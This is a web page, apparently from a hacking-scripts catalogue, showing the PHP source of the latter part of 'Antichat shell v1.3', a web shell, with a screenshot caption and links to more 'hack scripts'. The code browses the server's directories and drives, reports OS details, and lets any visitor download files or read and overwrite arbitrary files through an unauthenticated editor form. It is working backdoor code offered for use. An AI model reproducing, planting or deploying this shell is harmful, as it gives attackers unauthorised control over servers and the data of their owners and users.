<span class="lineno">115</span>   <span class="nv">$dir</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$dir</span><span class="p">);</span>
<span class="lineno">116</span> <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">117</span>     <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$dh</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">118</span>         <span class="k">while</span> <span class="p">((</span><span class="nv">$file</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">))</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">119</span>           <span class="k">if</span><span class="p">(</span><span class="nb">filetype</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">)</span><span class="o">==</span><span class="s2">&quot;dir&quot;</span><span class="p">)</span> <span class="nv">$dire</span><span class="p">[]</span><span class="o">=</span><span class="nv">$file</span><span class="p">;</span>
<span class="lineno">120</span>           <span class="k">if</span><span class="p">(</span><span class="nb">filetype</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">)</span><span class="o">==</span><span class="s2">&quot;file&quot;</span><span class="p">)</span><span class="nv">$files</span><span class="p">[]</span><span class="o">=</span><span class="nv">$file</span><span class="p">;</span>
<span class="lineno">121</span>         <span class="p">}</span>
<span class="lineno">122</span>         <span class="nb">closedir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">);</span>
<span class="lineno">123</span>         <span class="o">@</span><span class="nb">sort</span><span class="p">(</span><span class="nv">$dire</span><span class="p">);</span>
<span class="lineno">124</span>         <span class="o">@</span><span class="nb">sort</span><span class="p">(</span><span class="nv">$files</span><span class="p">);</span>
<span class="lineno">125</span>         
<span class="lineno">126</span> <span class="k">echo</span> <span class="s2">&quot;&lt;table cellSpacing=0 border=1 style=</span><span class="se">\&quot;</span><span class="s2">border-color:black;</span><span class="se">\&quot;</span><span class="s2"> cellPadding=0 width=</span><span class="se">\&quot;</span><span class="s2">100%</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">;</span>
<span class="lineno">127</span> <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&lt;form method=POST&gt;Open directory:&lt;input type=text name=dir value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$dir</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=50&gt;&lt;input type=submit value=</span><span class="se">\&quot;</span><span class="s2">GO</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno">128</span> <span class="k">if</span> <span class="p">(</span><span class="nb">strtoupper</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="k">PHP_OS</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">))</span> <span class="o">===</span> <span class="s1">&#39;WIN&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">129</span> <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;Select drive:&quot;</span><span class="p">;</span>
<span class="lineno">130</span> <span class="k">for</span> <span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;C&#39;</span><span class="p">);</span> <span class="nv">$j</span><span class="o">&lt;=</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;Z&#39;</span><span class="p">);</span> <span class="nv">$j</span><span class="o">++</span><span class="p">)</span> 
<span class="lineno">131</span>  <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$dh</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nv">$j</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;:/&quot;</span><span class="p">))</span>
<span class="lineno">132</span>  <span class="k">echo</span> <span class="s1">&#39;&lt;a href=&quot;#&quot; onclick=&quot;document.reqs.action.value=\&#39;viewer\&#39;; document.reqs.dir.value=\&#39;&#39;</span><span class="o">.</span><span class="nb">chr</span><span class="p">(</span><span class="nv">$j</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;:/\&#39;; document.reqs.submit();&quot;&gt; &#39;</span><span class="o">.</span><span class="nb">chr</span><span class="p">(</span><span class="nv">$j</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;a/&gt;&#39;</span><span class="p">;</span>
<span class="lineno">133</span>  <span class="k">echo</span> <span class="s2">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno">134</span> <span class="p">}</span>
<span class="lineno">135</span> <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;OS: &quot;</span><span class="o">.@</span><span class="nb">php_uname</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">136</span> <span class="s2">&lt;tr&gt;&lt;td&gt;name dirs and files&lt;/td&gt;&lt;td&gt;type&lt;/td&gt;&lt;td&gt;size&lt;/td&gt;&lt;td&gt;permission&lt;/td&gt;&lt;td&gt;options&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno">137</span> <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$dire</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">138</span> <span class="nv">$link</span><span class="o">=</span><span class="nv">$dir</span><span class="o">.</span><span class="nv">$dire</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
<span class="lineno">139</span>   <span class="k">echo</span> <span class="s1">&#39;&lt;tr&gt;&lt;td&gt;&lt;a href=&quot;#&quot; onclick=&quot;document.reqs.action.value=\&#39;viewer\&#39;; document.reqs.dir.value=\&#39;&#39;</span><span class="o">.</span><span class="nv">$link</span><span class="o">.</span><span class="s1">&#39;\&#39;; document.reqs.submit();&quot;&gt;&#39;</span><span class="o">.</span><span class="nv">$dire</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&lt;a/&gt;&lt;/td&gt;&lt;td&gt;dir&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&#39;</span><span class="o">.</span><span class="nx">perms</span><span class="p">(</span><span class="nv">$link</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/td&gt;&lt;/tr&gt;&#39;</span><span class="p">;</span>  
<span class="lineno">140</span>   <span class="p">}</span>
<span class="lineno">141</span> <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$files</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">142</span> <span class="nv">$linkfile</span><span class="o">=</span><span class="nv">$dir</span><span class="o">.</span><span class="nv">$files</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
<span class="lineno">143</span> <span class="k">echo</span> <span class="s1">&#39;&lt;tr&gt;&lt;td&gt;&lt;a href=&quot;#&quot; onclick=&quot;document.reqs.action.value=\&#39;editor\&#39;; document.reqs.file.value=\&#39;&#39;</span><span class="o">.</span><span class="nv">$linkfile</span><span class="o">.</span><span class="s1">&#39;\&#39;; document.reqs.submit();&quot;&gt;&#39;</span><span class="o">.</span><span class="nv">$files</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&lt;/a&gt;&lt;br&gt;&lt;/td&gt;&lt;td&gt;file&lt;/td&gt;&lt;td&gt;&#39;</span><span class="o">.</span><span class="nx">view_size</span><span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$linkfile</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;&lt;/td&gt;</span>
<span class="lineno">144</span> <span class="s1">&lt;td&gt;&#39;</span><span class="o">.</span><span class="nx">perms</span><span class="p">(</span><span class="nv">$linkfile</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/td&gt;</span>
<span class="lineno">145</span> <span class="s1">&lt;td&gt;</span>
<span class="lineno">146</span> <span class="s1">&lt;a href=&quot;#&quot; onclick=&quot;document.reqs.action.value=\&#39;download\&#39;; document.reqs.file.value=\&#39;&#39;</span><span class="o">.</span><span class="nv">$linkfile</span><span class="o">.</span><span class="s1">&#39;\&#39;; document.reqs.submit();&quot; title=&quot;Download&quot;&gt;D&lt;/a&gt;</span>
<span class="lineno">147</span> <span class="s1">&lt;a href=&quot;#&quot; onclick=&quot;document.reqs.action.value=\&#39;editor\&#39;; document.reqs.file.value=\&#39;&#39;</span><span class="o">.</span><span class="nv">$linkfile</span><span class="o">.</span><span class="s1">&#39;\&#39;; document.reqs.submit();&quot; title=&quot;Edit&quot;&gt;E&lt;/a&gt;&lt;/tr&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">148</span> <span class="p">}</span>
<span class="lineno">149</span> <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;&quot;</span><span class="p">;</span>
<span class="lineno">150</span> <span class="p">}}}</span>
<span class="lineno">151</span> 
<span class="lineno">152</span> <span class="k">if</span><span class="p">(</span><span class="nv">$action</span><span class="o">==</span><span class="s2">&quot;viewer&quot;</span><span class="p">){</span>
<span class="lineno">153</span> <span class="nx">scandire</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
<span class="lineno">154</span> <span class="p">}</span>
<span class="lineno">155</span> <span class="c1">//end viewer FS</span>
<span class="lineno">156</span> 
<span class="lineno">157</span> <span class="c1">//editros</span>
<span class="lineno">158</span> <span class="k">if</span><span class="p">(</span><span class="nv">$action</span><span class="o">==</span><span class="s2">&quot;editor&quot;</span><span class="p">){</span>  
<span class="lineno">159</span>   <span class="k">function</span> <span class="nf">writef</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="nv">$data</span><span class="p">){</span>
<span class="lineno">160</span>   <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;w+&quot;</span><span class="p">);</span>
<span class="lineno">161</span>   <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$data</span><span class="p">);</span>
<span class="lineno">162</span>   <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno">163</span>   <span class="p">}</span>
<span class="lineno">164</span>   <span class="k">function</span> <span class="nf">readf</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span>
<span class="lineno">165</span>   <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$le</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">))</span> <span class="nv">$contents</span><span class="o">=</span><span class="s2">&quot;Can&#39;t open file, permission denide&quot;</span><span class="p">;</span> <span class="k">else</span> <span class="p">{</span>
<span class="lineno">166</span>   <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$le</span><span class="p">,</span> <span class="nb">filesize</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
<span class="lineno">167</span>   <span class="nb">fclose</span><span class="p">(</span><span class="nv">$le</span><span class="p">);}</span>
<span class="lineno">168</span>   <span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$contents</span><span class="p">);</span>
<span class="lineno">169</span>   <span class="p">}</span>
<span class="lineno">170</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;save&#39;</span><span class="p">])</span><span class="nx">writef</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]);</span>
<span class="lineno">171</span> <span class="k">echo</span> <span class="s2">&quot;&lt;form method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&gt;</span>
<span class="lineno">172</span> <span class="s2">&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">action</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">editor</span><span class="se">\&quot;</span><span class="s2">&gt;</span>
<span class="lineno">173</span> <span class="s2">&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">file</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$file</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;</span>
<span class="lineno">174</span> <span class="s2">&lt;textarea name=</span><span class="se">\&quot;</span><span class="s2">data</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">40</span><span class="se">\&quot;</span><span class="s2"> cols=</span><span class="se">\&quot;</span><span class="s2">180</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="o">.@</span><span class="nx">readf</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/textarea&gt;&lt;br&gt;</span>
<span class="lineno">175</span> <span class="s2">&lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">save</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">save</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">reset</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">reset</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/form&gt;&quot;</span><span class="p">;</span>
<span class="lineno">176</span> <span class="p">}</span>
<span class="lineno">177</span> <span class="c1">//end editors</span>
<span class="lineno">178</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">179</span> <span class="x">&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table width=&quot;100%&quot; bgcolor=&quot;#336600&quot; align=&quot;right&quot; colspan=&quot;2&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;&lt;tr&gt;&lt;td&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;a href=&quot;http://antichat.ru&quot;&gt;COPYRIGHT BY ANTICHAT.RU </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$version</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x">&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/tr&gt;&lt;/td&gt;&lt;/table&gt;</span>
<span class="lineno">180</span> <span class="cp">&lt;?</span> <span class="k">echo</span> <span class="nv">$footer</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x"></span></code></pre></div>

<h3>Antichat shell version 1.3 screenshot<figure id="attachment_437" style="width: 808px;" class="wp-caption aligncenter"></h3>

<p><a href="http://hackingscripts.com//wp-content/uploads/2014/02/antichat-shell.png"><img src="http://hackingscripts.com//wp-content/uploads/2014/02/antichat-shell.png" alt="Antichat Shell v1.3 screenshot" width="808" height="317" class="size-full wp-image-437" /></a><figcaption class="wp-caption-text">Antichat Shell v1.3 screenshot</figcaption></figure></p>



        </section>

        <aside id="sidebar">
          <a href="http://hackingscripts.com//upload/" class="button">
            <small>Upload</small>
            a file
          </a>


          <a href="http://hackingscripts.com//scripts/" class="button">
            <small>The entire list of</small>
            hack scripts
          </a>
          <!--
          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>

          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
      -->
        </aside>

      </div>
    </div>

  </body>
</html>
